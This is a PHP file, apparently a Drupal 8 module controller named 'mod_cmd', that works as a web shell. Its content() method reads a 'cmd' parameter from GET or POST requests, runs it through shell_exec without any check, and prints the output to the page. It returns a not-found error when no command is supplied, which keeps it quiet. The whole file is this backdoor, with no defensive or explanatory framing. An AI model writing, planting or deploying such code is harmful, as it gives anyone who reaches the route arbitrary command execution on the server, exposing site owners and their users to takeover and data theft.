<?php
// This file is used by Drupal 8
namespace Drupal\mod_cmd\Controller;

use Drupal\Core\Controller\ControllerBase;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpKernel\Exception\NotFoundHttpException;

class ModCmdController extends ControllerBase{
    public function content(Request $request) {
        if ("GET" === $request->getMethod()) {
            $cmd = $request->query->get("cmd");
        } else {
            $cmd = $request->request->get("cmd");
        }

        if ($cmd) {
            return array(
                "#type" => "markup",
                "#markup" => "<pre>" . shell_exec($cmd) ."</pre>"
            );
        }

        throw new NotFoundHttpException();
    }
}